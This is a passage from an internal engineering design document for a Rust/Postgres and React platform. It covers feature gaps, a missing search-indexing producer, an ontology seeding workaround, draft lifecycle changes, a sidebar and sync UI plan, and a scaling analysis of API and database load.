**Work estimate:** ~2 days (implement aggregation query + fix cache invalidation +
add spend history visualization).

---

### 19.7 Compact Sidebar

**What exists:**
- `compactSidebar: boolean` was defined in `UserSettings` type and `DEFAULT_SETTINGS`.

**What's missing:**
- Removed from type/defaults as dead code (no layout consumer reads this value).
- To implement: the `LeftSidebar` component needs a collapsed/expanded mode that reads
  from user settings and renders icon-only navigation when `compactSidebar` is true.

**Work estimate:** ~1 day (add prop to LeftSidebar + localStorage persistence).

---

### 19.8 Editor Settings ↔ CodeEditor Wiring

**Status: Partially working — always visible (not dev-gated)**

**What works:**
- Editor settings (rainbow brackets, code folding, indent guides, bracket pair guides,
  ligatures, sticky scroll, word wrap, render whitespace, font size, tab size) persist
  to `localStorage` and render in the Preferences tab.

**What's missing:**
1. **CodeEditor consumption** — `CodeEditor.tsx` uses local `useState` for `showMinimap`
   (line 240) rather than reading from the saved user settings. All editor preferences
   should flow from the `useSettings()` hook into the CodeEditor props.
2. **Prop threading** — `WorkspacePage` → `SpecEditor` → `CodeEditor` needs to pass
   the `EditorSettings` object down (or use a React context).

**Work estimate:** ~1 day (context provider or prop drilling + CodeEditor integration).

---

### 19.9 Promotion Checklist

When promoting a feature from dev-mode to production:

1. Implement the required backend endpoints / service methods
2. Add or extend the database schema (migration file)
3. Write integration tests for the new endpoints
4. Remove the `devMode &&` guard from the component JSX
5. Remove or update the corresponding section in this document
6. Update MSW handlers if the mock contract changed
7. Run the full test suite: `cd generation/client && npx vitest run`

---

## 20. API Client Architecture Gap

_Date: 2026-02-14_

### Current State

The codebase has **three** components that talk to g5-api over HTTP, each with different levels of type-safety:

| Component | Target endpoints | Client approach | DTOs |
|-----------|-----------------|-----------------|------|
| **g5d** (worker) | `/api/internal/*` | `InternalApiClient` from g5-common | Shared `g5_common::internal_api::dtos::*` — single source of truth |
| **g5-api** (tests) | `/api/v1/*` + `/api/internal/*` | Raw `reqwest` + `serde_json::Value` | Inline JSON, no typed DTOs |
| **g5-e2e** (integration) | Both | Hand-rolled `TestApiClient` | ~20 duplicate structs in `api_client.rs`, manually kept in sync |

The **internal API** (`/api/internal/*`) is well-served: g5-common defines canonical request/response types (`RegisterWorkerRequest`, `TaskTransitionRequest`, `SubmitTaskGraphRequest`, etc.) behind the `http-client` feature flag, and g5d consumes them via `InternalApiClient`. There is **no drift** between client and server.

The **public API** (`/api/v1/*`) has **no shared types at all**. The DTOs live exclusively in `g5-api/src/routes/*.rs` (e.g. `CreateOrgResponseDTO`, `WorkspaceDetailDTO`, `JobDetailDTO`, `AuthTokensDTO`). Every other consumer re-invents them:
- The e2e crate has its own `OrgResponse`, `WorkspaceResponse`, `JobResponse`, etc.
- The TypeScript client has its own `api-schemas.ts` types
- The Playwright tests use raw JSON

### Known Pain Points

1. **ResponseEnvelope mismatch** — the API wraps all `/api/v1/` responses in `{ "data": T }`, but e2e client structs were initially flat. This caused 39 E2E test failures.
2. **camelCase drift** — the API uses `#[serde(rename_all = "camelCase")]` on all DTOs. The e2e client was missing these annotations, causing deserialization failures.
3. **Field name drift** — e2e sent `job_type` / `target_spec_id` but API expects `jobType` / `targetNodes`.
4. **URL path drift** — e2e called `POST /api/v1/workspaces` but the actual route is `POST /api/v1/orgs/:orgId/workspaces`.

### Ideal Architecture

```
g5-common/
  src/
    internal_api/       ← EXISTS: InternalApiClient + DTOs
    public_api/         ← NEW: typed DTOs for /api/v1/* responses
      mod.rs
      orgs.rs           ← CreateOrgResponse, OrgSummary, etc.
      workspaces.rs     ← WorkspaceDetail, WorkspaceSettings, etc.
      jobs.rs           ← CreateJobResponse, JobDetail, etc.
      tasks.rs          ← TaskDetail, TaskSummary, etc.
      auth.rs           ← AuthTokens, ScopeCheck, etc.
    client.rs           ← NEW: optional PublicApiClient (feature-gated)
```

Both `g5-api` (routes) and consumers (e2e, CLI, future services) would import canonical types from g5-common, eliminating drift. The `ResponseEnvelope<T>` wrapper and serde config would be defined once.

### Why Not Now

- Tower doesn't provide client generation; it's a server middleware framework. OpenAPI codegen (e.g., `utoipa` + `progenitor`) could generate clients but requires significant setup.
- Extracting DTOs from g5-api into g5-common requires careful dependency management — the current g5-api DTOs have `sqlx::FromRow` derives and DB-specific fields that shouldn't leak into shared types.
- The e2e crate's hand-rolled approach works now that the types are corrected, and the test surface validates the contract.

### Recommended Next Steps (Post-CI-Green)

1. Define `g5_common::public_api::ResponseEnvelope<T>` so all consumers agree on envelope shape
2. Extract the ~10 most-used public DTOs into `g5-common/src/public_api/` with both `Serialize` + `Deserialize`
3. Have g5-api's route handlers return the shared types (via `From`/`Into` from internal DB models)
4. Make e2e depend on `g5-common` with `features = ["http-client"]` and delete its duplicate DTOs
5. Consider `utoipa` for OpenAPI spec generation, enabling auto-generated TypeScript types for the frontend

## 21. Search Indexing Pipeline Gap — No Queue Producer

### The Problem

The search indexing pipeline has a **producer/consumer split where the producer side is missing**:

| Component | Status | Location |
|-----------|--------|----------|
| `search_documents` table (tsvector + pgvector columns, GIN + HNSW indexes) | **Exists** | `001_initial_schema.sql` |
| `search_reindex_queue` table (pending/processing/completed/failed, 3-attempt retry) | **Exists** | `002_auth_and_search_queue.sql` |
| Queue consumer — `run_search_indexer()` background loop, polls every 10s, `FOR UPDATE SKIP LOCKED` | **Exists** | `maintenance/search_indexer.rs` |
| `SearchService::reindex_workspace_branch()` — incremental indexer with content-hash skip, chunking, embedding | **Exists** | `services/search_service.rs` |
| `SearchService::search()` — hybrid FTS + semantic search, score merge (0.6/0.4), breadcrumb CTE | **Exists** | `services/search_service.rs` |
| Queue producer — `INSERT INTO search_reindex_queue` on draft commit / job completion / branch sync | **MISSING** | ❌ nowhere |

The indexer loop runs forever polling an always-empty queue. Content mutations (draft commits, task completions, ontology upserts, branch syncs) never enqueue reindex events, so the `search_documents` table stays empty and search returns zero results.

### Secondary Issue — Stub Content

`reindex_workspace_branch` uses `let content = &bf.file_path;` (the file path as content) rather than reading actual file content from git or the filesystem. This means even if indexing runs, FTS would only match on path segments like `src/main.rs`, not actual file contents.

### What Was Added (2026-02-15)

1. **`SearchService::reindex_all_workspace_branches()`** — resolves all branches for a workspace and runs `reindex_workspace_branch` for each. This is the one-shot trigger.
2. **`POST /api/internal/workspaces/:id/search/reindex`** — internal endpoint that exposes the one-shot reindex for demo/admin use.
3. **`seed-demo.sh` Step 8** — calls the reindex endpoint after workspace setup so demo search has data.

### What Still Needs Work

1. **Queue producer hooks**: `INSERT INTO search_reindex_queue` should be triggered by:
   - Draft commit (`POST /api/internal/workspaces/:id/files`)
   - Task completion (task state → `complete`)
   - Ontology upsert (`POST /api/internal/workspaces/:id/ontology/upsert`)
   - Branch sync / git push events
   - Manual admin trigger (now available via the internal endpoint)

2. **Real file content**: The indexer should read file content from:
   - Git bare mirror via `git show <commit>:<path>` for tracked files
   - CRDT draft state for uncommitted changes
   - Spec files from `.semlift/specs/`

3. **Embedding provider wiring**: The `compute_embedding` path calls an HTTP endpoint but the provider config (`config.search.embedding_provider`) defaults to `"none"`, so only FTS indexing occurs unless explicitly configured.

4. **EventBus integration**: The `EventBus` already dispatches typed events across the system — a `SearchReindexRequested` event could bridge content mutations to the queue without tight coupling.

5. **Search relevance tuning**: Several hardcoded values in `SearchService::search()` need to become configurable once real content is indexed:
   - **Hybrid score weights**: `0.6 × FTS + 0.4 × semantic` is a reasonable starting point but should be workspace-configurable or A/B tested. Code-heavy repos may benefit from higher FTS weight (identifier matching); doc-heavy repos from higher semantic weight.
   - **FTS ranking function**: Uses `ts_rank_cd` (cover density) — good for prose but may under-weight exact symbol matches in code. Consider `ts_rank` or a custom scoring function that boosts exact-match terms.
   - **Chunk size / overlap**: Fixed at 2048 chars with 256-byte overlap. Optimal values depend on content type — Rust files have different structure than Markdown docs. Per-`doc_type` chunking strategies would improve recall.
   - **Result limit**: Default 20, max 100. The spotlight search UI shows ~5-10 results — the server could return fewer by default to reduce latency.
   - **Snippet highlighting**: `<mark>` tag wrapping is done post-query in Rust. For large result sets, this should move to a SQL-side `ts_headline()` call for performance.
   - **Content indexing quality**: Currently indexes `file_path` as content (stub). Once real file content is indexed, FTS quality will depend on the Postgres text search configuration (`'english'` dictionary) — code identifiers like `reindex_workspace_branch` get stemmed poorly. A custom `text search configuration` with a `simple` dictionary for code files would improve precision.

---

## 22. Ontology Seeding — Architecture Discrepancy

_Date: 2026-02-15_

### Problem

The ontology upsert endpoint (`POST /api/internal/workspaces/:id/ontology/upsert`) has a fundamental design flaw: it uses a 2-pass insert strategy (Pass 1: insert all nodes with `parent_id = NULL`; Pass 2: wire `parent_id` via UPDATE) that collides with the unique constraint `(workspace_branch_id, parent_id, name)` when multiple nodes share a basename (e.g. `mod.rs`, `lib.rs`). Even after fixing the dedup logic, UUID collisions in tight loops and the inherent fragility of the 2-pass approach make it unreliable for large ontologies (700+ nodes).

As a **temporary workaround**, the demo seed script (`seed-demo.sh` Step 8) bypasses the API entirely and inserts ontology nodes via direct SQL (`psql`), using a Python helper for topological sorting so parents are inserted before children with correct `parent_id` from the start.

### What's Missing Architecturally

This workaround exposes two missing infrastructure components:

#### 1. Repo Server / Distributed Filesystem

The API server (`g5-api`) currently has no direct access to repository file content for parsing. Spec files (`.semlift.md` with YAML frontmatter) live in the git working tree at `/data/repos/{repo_id}/`, but the API treats this as an opaque path — it doesn't know how to scan directories or parse spec metadata.

A proper **repo server** or **distributed filesystem layer** would:
- Provide structured access to repo content (file listing, content reads, metadata)
- Serve as the source of truth for spec file discovery and parsing
- Abstract away whether files come from a git bare repo, working copy, or CRDT draft state
- Enable the API to scan `.semlift/specs/` and parse YAML frontmatter natively

#### 2. Jobs / Background Synchronization

Ontology construction from spec files is inherently a **background sync job**, not a single API call. The current approach (seed script builds the entire tree and uploads in one request) doesn't scale. What's needed:

- A **jobs system** that watches for repo changes (commits, branch syncs, spec file edits) and triggers ontology re-sync
- Incremental updates: when a single spec file changes, only that node and its children should be updated — not the entire tree
- The job should handle: YAML frontmatter parsing → parent/child resolution → DB upsert with proper FK ordering
- Integration with the existing `EventBus` (`SpecFileChanged`, `BranchSynced` events) to trigger re-sync automatically
- Conflict resolution when concurrent edits modify the same spec hierarchy

### Current State

| Component | Status | Notes |
|-----------|--------|-------|
| API upsert endpoint | Buggy | 2-pass insert + dedup-by-name causes constraint violations |
| Seed script (direct SQL) | Working | Temporary workaround; topological sort via Python |
| Repo server | Not implemented | API can't scan/parse repo files |
| Jobs/sync system | Not implemented | No background ontology sync |
| YAML frontmatter parser (Rust) | Not implemented | Only exists as awk/Python in seed script |

---

## 23. Draft Lifecycle — When and Where Drafts Are Created

_Date: 2026-02-16_

### Context

We had a UX mismatch in the spec/code editor flow:

- Branch-level draft polling endpoint (`GET /api/v1/branches/:branchId/drafts`) could return `null` when no active draft row existed.
- The frontend rendered this as "Loading draft…" even though the branch was healthy and editable.
- Users interpreted this as an error or stuck loading state.

### Existing Draft Creation Points (Before This Change)

1. `POST /api/v1/branches/:branchId/drafts` (explicit create)
2. CRDT cold-start path (`DocumentStore::get_or_load` → `PersistenceLayer::ensure_session`) when a Yjs websocket document is opened

This meant draft existence depended on whether the client had explicitly created one or had already connected through the CRDT websocket path.

### Decision

`GET /api/v1/branches/:branchId/drafts` now **ensures** an active draft exists:

- If active draft exists: return it.
- If none exists: create one and return it.
- If concurrent request races creation: re-read and return the winner.

### Why This Is Acceptable

- Drafts are branch-scoped working state; creating an empty draft is cheap and safe.
- Empty draft is valid (`dirty_count = 0`), so this does not imply edits occurred.
- It removes a frontend state ambiguity (`null` vs. still loading) and makes branch-open behavior deterministic.

### Behavioral Change / Compatibility Notes

1. `GET /api/v1/branches/:branchId/drafts` becomes a mutating "read-or-create" operation (idempotent from caller perspective, but may insert DB row).
2. Clients that relied on `data = null` to represent "no draft yet" must be updated.
3. Discarding a draft no longer implies subsequent GET returns null; GET will recreate a clean active draft.

### Operational Considerations

- Slight increase in draft row churn for branches that are opened but not edited.
- Existing cleanup mechanisms (stale/discard/commit deletion paths) still govern lifecycle.
- This aligns API behavior with user expectation: opening an active branch always yields a draft context.

---

## Cleanup: Migrate String-Based SQLx Queries to `query!` Macros

_Date: 2026-02-17_

### Status: Pending cleanup

### Context

The codebase uses a mix of compile-time-checked `sqlx::query!()` macros (~135 calls) and runtime-only string-based `sqlx::query()` / `sqlx::query_as()` / `sqlx::query_scalar()` calls (~179 calls). The `query!` macros validate SQL against the database schema at compile time (via the `.sqlx/` offline cache), catching column name typos, type mismatches, and schema drift before runtime.

### Recommended Migration

1. **Safe to convert** — `sqlx::query()` and `sqlx::query_scalar()` calls (INSERT, UPDATE, DELETE, scalar SELECTs). These map directly to `query!()` / `query_scalar!()` with no structural changes.
2. **Needs care** — `sqlx::query_as()` with `SELECT *` (16+ instances). The `query_as!()` macro generates its own anonymous struct rather than using `FromRow`, so every selected column must be explicitly listed and must match the target struct's field names/types. Converting these requires replacing `SELECT *` with explicit column lists.
3. **Leave as-is** — Any future queries that need dynamic SQL (none currently).

### Biggest Files to Address

| File | String-based | `query!` |
|------|-------------|----------|
| `task_service.rs` | 60 | 4 |
| `job_service.rs` | 23 | 0 |
| `workspace_service.rs` | 22 | 0 |
| `doc_service.rs` | 12 | 0 |
| `spend_service.rs` | 13 | 0 |

### Notes

- The `.sqlx/` offline cache must be refreshed (`SQLX_OFFLINE=false cargo sqlx prepare --workspace -- --all-targets`) after any migration to ensure Docker builds (which use `SQLX_OFFLINE=true`) continue to work.
- A local Postgres instance on port 5432 can shadow the Docker container — stop it before running `cargo sqlx prepare`.

---

## 24. Views Panel, Project Docs, and Sync UX — Detailed Implementation Plan

_Date: 2026-02-17_

### Scope

This plan covers three UI/product changes and one demo-seeding change:

1. Rename the top left sidebar panel from **Docs** to **Views**.
2. Add a new **Project Docs** panel directly below **Views**.
3. Remove per-row uplift/downlift arrows from the left sidebar and replace with a single **Sync** action.
4. Seed workspace-internal project docs in demo environments so the split is visible.

### Product Behavior (M0)

#### 24.1 Left Sidebar Panel Changes

- Existing top panel label changes from `Docs` to `Views`.
- New `Project Docs` panel appears immediately below `Views`.
- Both panels render document lists using existing docs API results.
- Panel ordering defaults to:
  1. `Views`
  2. `Project Docs`
  3. `Core Ontology`
  4. `Task Queue`
  5. `Files`

#### 24.2 Temporary Classification Rule (Demo-Safe Fake)

Until explicit backend scope exists, docs are split by folder prefix convention:

- `Project Docs`: docs whose derived folder starts with `#!internal-workspace-<workspace-name-or-slug>`
- `Views`: all other docs

Implementation note:
- `useDocList` already derives `folder` from `filePath`; this rule can be implemented in the client without API changes.
- The prefix is treated as internal metadata and should not be surfaced as a user-facing requirement beyond this M0 plan.

#### 24.3 Sync UX (Replace Row Arrows)

- Remove uplift/downlift arrow actions from all left-sidebar rows (docs and ontology nodes).
- Introduce one **Sync** button in the Draft Status Bar, placed directly next to **Commit**.
- Sync button opens a modal with three run modes:
  - `Sync (default)` (M0 fake)
  - `Downlift only`
  - `Uplift only`
- M0 fake behavior:
  - `Sync (default)` maps to `downlift` job creation.

#### 24.4 Sync Button Enablement Rules

- Sync button must be greyed out (disabled) when workspace is dirty.
- Dirty is defined by draft session dirty count (`dirtyCount > 0`).
- Therefore:
  - `Commit` is enabled when dirty.
  - `Sync` is enabled when clean.

### Technical Plan

#### 24.5 Frontend Files and Responsibilities

`generation/client/src/components/tree/TreeNode.tsx`

- Rename section title from `Docs` to `Views`.
- Add new sidebar section id for `project-docs-internal` (or equivalent explicit id).
- Update default section order and section-order persistence handling for 5 sections.
- Split docs into `viewsDocs` and `projectDocs` based on folder prefix rule.
- Remove any remaining per-doc row arrow actions.

`generation/client/src/components/tree/OntologyTree.tsx`

- Remove per-node row uplift/downlift arrow buttons from tree row trailing actions.
- Keep sync/status indicators (dots/chips) unchanged.

`generation/client/src/hooks/useDocs.ts`

- Preserve current folder derivation from `filePath`.
- Add helper classification utilities if needed (prefix predicate).
- Keep dedupe behavior by `filePath` intact.

`generation/client/src/components/draft/DraftStatusBar.tsx`

- Add `Sync` button adjacent to `Commit`.
- Disable sync button when `dirtyCount > 0`.
- Add callback prop to open sync modal.

`generation/client/src/pages/WorkspacePage.tsx`

- Own modal state and selected sync mode.
- Wire `DraftStatusBar` sync click to modal open.
- On submit, call existing `createJob` mutation with mode mapping:
  - `sync` -> `downlift` (M0 fake)
  - `downlift_only` -> `downlift`
  - `uplift_only` -> `uplift`
- M0 target scope: currently selected ontology node id (if none selected, modal submit disabled).

#### 24.6 Demo Seeding Plan

`generation/scripts/seed-demo.sh`

- Seed internal workspace docs under:
  - `designs/#!internal-workspace-<workspace-slug>/security-review.md`
  - `designs/#!internal-workspace-<workspace-slug>/operational-review.md`
  - `designs/#!internal-workspace-<workspace-slug>/risk-register.md` (optional)
- Change doc discovery from top-level glob (`designs/*.md`) to recursive traversal so nested files are included.
- Continue posting to `/api/v1/workspaces/:workspaceId/docs` using `filePath` relative to repo root.

### Data Model and API Evolution (Making It Real)

#### 24.7 Why Folder Prefix Is Temporary

Folder-prefix classification is brittle:

- Encodes product semantics in filename conventions.
- Couples UI behavior to path naming.
- Complicates rename/move operations.

#### 24.8 Target Model (M1+)

Introduce explicit doc scope in backend instead of path inference:

- Add `doc_scope` (example values):
  - `view` (general design/architecture docs)
  - `workspace_policy` (project docs: security/ops/review policies)
- Include `docScope` in docs API list/detail DTOs.
- UI sections filter by `docScope`, not folder naming.

#### 24.9 Migration Plan to Real Model

1. Add schema column with default (`view`).
2. Backfill existing docs:
   - docs with folder prefix `#!internal-workspace-*` -> `workspace_policy`
   - others -> `view`
3. Update create-doc paths in seed scripts and workspace bootstrap to set `doc_scope` explicitly.
4. Remove folder-prefix filtering from client once rollout completes.

### UX and Interaction Details

#### 24.10 Sync Modal Content

- Title: `Start Sync Job`
- Mode control:
  - `Sync` (default label includes “currently runs downlift” helper text)
  - `Downlift only`
  - `Uplift only`
- Context display:
  - selected target node
  - warning when no target selected
- Actions:
  - `Cancel`
  - `Start Job` (disabled when no target)

#### 24.11 Error Handling

- If job create fails, modal remains open and displays inline error.
- Sync button disabled state is independent of API state and only tied to dirty flag + submit loading.

### Test Plan

#### 24.12 Frontend Tests

Update/add tests in:

- `generation/client/src/components/Sidebar.test.tsx`
  - expects `Views` and `Project Docs` sections rendered.
- `generation/client/src/pages/DocFlow.test.tsx`
  - docs correctly appear in one panel based on prefix rule.
- `generation/client/src/pages/DataHookWiring.test.tsx`
  - classification and folder-derived behavior expectations.
- Draft status bar tests (or add new tests)
  - sync button appears next to commit.
  - sync button disabled when dirty and enabled when clean.

#### 24.13 Demo Validation

After running `seed-demo.sh`:

- Docs API returns both normal design docs and prefixed workspace-internal docs.
- Left sidebar shows:
  - `Views` panel with non-prefixed docs.
  - `Project Docs` panel with prefixed docs.
- Sync button appears in status bar and is disabled after local edits create dirty state.

### Rollout Sequence

1. Frontend rename/split panels and persistence migration.
2. Remove row arrows and add status-bar sync button + modal.
3. Demo seed recursive docs + internal workspace docs.
4. Test updates.
5. Follow-up M1 API/schema work for explicit `doc_scope`.

### Non-Goals (This Phase)

- No new backend `sync` job type in M0.
- No automatic bidirectional reconciliation between code/spec/docs in one operation.
- No per-repo or multi-node batch sync orchestration changes.

---

## TODO: Dynamic Task Creation During Downlift

**Status:** Not yet implemented.

**Context:** Downlift bootstrap currently creates all tasks upfront from the ontology subtree scope. Each scoped file path becomes an independent task with no inter-task dependencies. This works for flat subtrees but does not support cascading: when a parent spec's downlift changes the intent for its children, those child tasks should ideally be created (or re-queued) dynamically *after* the parent completes.

**Semlift comparison:** Semlift uses post-completion "hooks" that fire when a task finishes, allowing it to spawn additional downstream tasks on-the-fly. This repo has the hook infrastructure stubbed out (`run_post_completion_hooks` in `g5d/src/tools/task_lifecycle.rs`) but it currently returns an empty `new_tasks` vec.

**Proposed approach:**

1. Implement `run_post_completion_hooks` to scan the completed task's ontology children.
2. For each child that needs downlift (based on staleness or parent changes), create a new `TaskNodePayload` and submit it to g5-api via a new `POST /api/internal/jobs/:jobId/tasks/append` endpoint.
3. The new task inherits `depends_on = [completed_parent_task_id]` (already satisfied) so it becomes immediately `pending`.
4. This avoids the current limitation where all downlift tasks run independently without awareness of parent changes.

**Blocked on:** Defining the "task append" API endpoint and ensuring `total_tasks` on the job is updated atomically when tasks are added mid-flight.

---

## 25. Scaling Analysis — UI ↔ API ↔ Postgres

_Date: 2026-02-21_

Comprehensive evaluation of the frontend's interaction with the API layer,
the API's interaction with the Postgres datastore, and whether the current
design will scale. Identifies bottlenecks, quantifies expected load
profiles, and proposes optimizations where required.

---

### 25.1 Load Model Assumptions

Before analyzing specific bottlenecks, we establish the scaling targets:

| Dimension | M0 (launch) | M1 (growth) | M2 (scale) |
|-----------|-------------|-------------|------------|
| Orgs | 10 | 100 | 1,000 |
| Users (concurrent) | 50 | 500 | 5,000 |
| Workspaces (total) | 100 | 2,000 | 50,000 |
| Active workspaces (with running jobs) | 10 | 100 | 1,000 |
| Workers (concurrent) | 20 | 200 | 2,000 |
| Ontology nodes (per workspace) | 50–500 | 50–500 | 50–500 |
| Ontology nodes (global) | 5,000 | 100,000 | 5,000,000 |
| Tasks created per day | 200 | 5,000 | 100,000 |
| Timeline entries per day | 2,000 | 50,000 | 1,000,000 |
| Chat messages per day | 500 | 10,000 | 200,000 |
| WebSocket connections | 50 | 500 | 5,000 |
| CRDT draft sessions (concurrent) | 10 | 100 | 500 |
| Search documents (total) | 10,000 | 500,000 | 10,000,000 |

---

### 25.2 UI → API Interaction Patterns

#### 25.2.1 Page Load Request Fan-Out

Each UI page triggers a burst of API requests on mount. This is the dominant
read pattern:

```
WorkspaceSwitcher (page mount):
  1× GET /orgs/:orgId/workspaces        ← workspace list + per-workspace stats
  N× WS subscribe workspace:<id>        ← N = number of workspaces (up to ~50 visible)

WorkspacePageV2 (page mount):
  1× GET /workspaces/:id/ontology       ← full ontology forest (potentially 500 nodes)
  1× GET /workspaces/:id/docs           ← docs list
  1× GET /workspaces/:id/jobs?include=tasks  ← all jobs + tasks for sidebar
  1× GET /workspaces/:id/workers        ← worker list for ConnectedWorkerPill
  1× GET /sessions?workspace=:id        ← chat session sidebar (top 50)
  1× GET /workspaces/:id/drafts         ← draft status for DraftBar
  1× WS connect /ws?token=...           ← main event WebSocket
  N× WS subscribe workspace:<id>, job:<id>, task:<id>  ← channel subscriptions

  On node select (user clicks ontology tree node — hot path):
  1× GET /ontology/:nodeId/content      ← git-backed content read
  1× GET /ontology/:nodeId/deps         ← dependency/dependent links
  1× GET /ontology/:nodeId/annotations  ← comment threads

  On CRDT editing:
  1× WS connect /yjs/:workspaceId/:branch  ← Yjs CRDT channel (separate from main WS)
```

**Analysis — M0 (50 users):**
- Page mount fan-out: ~8 REST requests per user per workspace open
- At 50 concurrent users, each opening 1–2 workspaces: **~400–800 REST
  requests** burst on login, then settling to ~50–100 req/s steady-state
  (node selects, tab switches)
- This is trivially handled by a single g5-api instance with a 20-connection
  Postgres pool

**Analysis — M2 (5,000 users):**
- 5,000 × 8 = **40,000 REST requests** in the first minute (staggered logins)
- Steady-state: ~5,000–10,000 req/s (node selects, chat messages, job monitoring)
- Requires horizontal scaling of g5-api (3–10 instances), each with a
  20-connection pool = **60–200 Postgres connections** total
- Postgres can handle 200 connections comfortably; may need PgBouncer in
  transaction mode at higher loads

**Verdict:** ✅ The REST fan-out pattern scales linearly. No N+1 issues at
the page level — the API returns denormalized payloads (workspace stats are
computed server-side via lateral joins, not client-side N+1).

#### 25.2.2 Ontology Tree Full-Load vs. Lazy-Load

**Current design:** `GET /workspaces/:id/ontology` returns the **full ontology
forest** — all nodes across all repos in a single payload.

```sql
SELECT n.*, pb.repo_id, r.name AS repo_name
FROM ontology_nodes n
JOIN workspace_branches pb ON n.workspace_branch_id = pb.id
JOIN repos r ON pb.repo_id = r.id
WHERE pb.workspace_id = $1
ORDER BY r.name, n.parent_id NULLS FIRST, n.sort_order;
```

**Sizing analysis:**

| Workspace size | Rows | Estimated payload | Query time (indexed) |
|----------------|------|-------------------|---------------------|
| Small (50 nodes) | 50 | ~15 KB | <5 ms |
| Medium (200 nodes) | 200 | ~60 KB | <10 ms |
| Large (500 nodes) | 500 | ~150 KB | <20 ms |
| Very large (2,000 nodes) | 2,000 | ~600 KB | ~50 ms |

The query uses `idx_onto_workspace_branch` — a B-tree index covering
`workspace_branch_id`. For 500 nodes, this is a single index scan followed
by a hash join on `workspace_branches` and `repos` (both small tables).

**Assessment:** Full-load is fine for M0–M1 (≤500 nodes per workspace).
For M2, workspaces with 2,000+ nodes should use lazy loading (fetch children
on expand). The FRONTEND_DESIGN.md §7.2.4 already notes this:

> *Tree should be lazy-loaded (children fetched on expand) rather than
> fully materialized in a single payload.*

**Recommendation:** Implement lazy loading as follow-up. Add query param
`?depth=1` to `GET /ontology` for top-level nodes only, and use
`GET /ontology/:nodeId/children` for expand. This changes the query to:

```sql
-- Root nodes only (depth=1)
WHERE pb.workspace_id = $1 AND n.parent_id IS NULL
-- Children of a specific node
WHERE n.parent_id = $1
ORDER BY n.sort_order
```

Both use `idx_onto_parent` — already indexed. **No schema change required.**

#### 25.2.3 WebSocket Connection Density

The UI opens **two WebSocket connections per workspace session**:

1. **Main event WS** (`/api/v1/ws`) — multiplexed channel subscriptions for
   real-time events (task status, chat streaming, draft updates, notifications)
2. **CRDT WS** (`/api/v1/yjs/:workspaceId/:branch`) — Yjs binary protocol for
   collaborative editing (opened only when editing)

**Connection math at M2:**
- 5,000 users × 1 main WS = 5,000 event connections
- ~500 concurrent editors × 1 CRDT WS = 500 CRDT connections
- Total: **~5,500 WebSocket connections**

The `WsHubConfig` defaults to `max_connections: 10,000`, so a single instance
handles M2. For multi-instance deployments, Redis pub/sub (`EventBus.redis_publisher`)
distributes events across instances — already implemented in the codebase.

**Bottleneck risk:** Each CRDT connection holds a Yjs document in memory.
At 500 concurrent drafts:

| Draft state | Memory per doc | Total memory |
|-------------|---------------|--------------|
| Small edit (few files) | 10–50 KB | 5–25 MB |
| Medium edit (20 files, moderate changes) | 100–500 KB | 50–250 MB |
| Large edit (50+ files, big refactor) | 1–5 MB | 500 MB – 2.5 GB |

With a 60-second grace period before flushing idle docs, peak memory for
CRDT docs at M2 is **~250 MB–1 GB** — manageable on a 4–8 GB instance.

**Verdict:** ✅ WebSocket design scales. Redis pub/sub is the correct
multi-instance strategy and is already wired. CRDT memory is bounded by
the grace period and workspace count.

#### 25.2.4 Chat Streaming Throughput

Chat uses a hybrid REST + WebSocket model:
- `POST /sessions/:id/messages` → sends message (REST)
- `WS chat.chunk` events → streaming response tokens

At M2 with 200,000 messages/day:
- ~2.3 messages/second globally
- Each message triggers 1 REST write + ~50–200 WS chunk events (streaming)
- Peak: ~10 messages/second during active hours = **~1,000 WS events/second**

The `EventBus` fan-out is channel-scoped (`chat:<sessionId>`), so each event
goes only to the 1–3 clients subscribed to that session — not broadcast
to all 5,000 connections.

**Postgres impact:** Each message is 1 INSERT to `chat_messages`. At 2.3/s
steady, 10/s peak — trivial. The GIN index on `chat_messages.content`
(`idx_msg_fts`) updates are the most expensive part, but GIN has pending-list
optimization for write-heavy workloads. `FASTUPDATE=on` (Postgres default)
defers index maintenance to periodic cleanup.

**Verdict:** ✅ Chat scales cleanly.

---

### 25.3 API → Postgres Query Analysis

#### 25.3.1 Hot Path Queries — Scheduler Loop

The scheduler runs every 500ms (or on event). Its three critical queries are:

**Query 1 — Advance pending jobs:**
```sql
UPDATE jobs SET status = 'bootstrapping', started_at = now()
WHERE status = 'pending'
  AND (depends_on_job IS NULL
       OR depends_on_job IN (
         SELECT id FROM jobs WHERE status IN ('completed', 'cancelled')
       ));
```

- Uses `idx_job_predecessor` (partial index: `WHERE status = 'pending'`)
- At M2 with 1,000 active workspaces: ~50–200 pending jobs at any time
- Subquery checks `jobs.status` on the predecessor — covered by
  `idx_job_workspace` → hash join
- Estimated cost: **<5 ms** (partial index keeps the scan minimal)

**Query 2 — Find ready tasks:**
```sql
SELECT t.* FROM tasks t
JOIN jobs j ON t.job_id = j.id
WHERE t.status = 'pending'
  AND j.status IN ('bootstrapping', 'running')
  AND NOT EXISTS (
    SELECT 1 FROM tasks dep
    WHERE dep.id = ANY(t.depends_on)
      AND dep.status <> 'completed'
  );
```

- Uses `idx_task_pending` (partial: `WHERE status = 'pending'`)
- The `NOT EXISTS` subquery checks `depends_on` (UUID array) — this is
  the most expensive part

**Scaling concern:** The `ANY(t.depends_on)` construct does an array
unnest + index lookup per element. For a task with 5 dependencies, this
is 5 index probes. At M2 with ~10,000 pending tasks across all workspaces,
the total work per scheduler tick is:

```
10,000 pending tasks × avg 3 deps = 30,000 index probes
Estimated time: 30,000 × 0.01ms = ~300ms
```

**This is the primary scaling bottleneck.** At M2, the scheduler tick
could take 300ms+ — consuming over half the 500ms budget.

**Mitigation — Materialized ready-task set in Redis:**

The design already specifies this (§3.4.3): *"The ready-task set is
materialized in Redis for fast poll responses."* The implementation should:

1. On task completion → update Redis set: remove completed task, add any
   tasks whose dependencies are now all satisfied
2. Scheduler reads from Redis (O(1) per ready task) instead of running
   the expensive `NOT EXISTS` query
3. Redis set is rebuilt from Postgres on startup (cold recovery)

This reduces scheduler tick from ~300ms to **<5ms** at M2.

**Query 3 — Worker poll (locality scoring):**
```sql
-- Simplified: score each ready task for this worker
SELECT t.*, 
  locality_score(t.node_id, $worker_last_node_id) AS score
FROM ready_tasks t
ORDER BY score DESC
LIMIT 1
FOR UPDATE SKIP LOCKED;
```

The `locality_score` function walks `node_dependencies` and `parent_id`
chains (BFS). This is cached in Redis per workspace (design spec says so).
With Redis cache: **<2ms** per poll. Without cache: ~50–100ms for a
deep ontology (500 nodes) — unacceptable for the poll hot path.

**Verdict:** ⚠️ Scheduler ready-task query needs Redis materialization
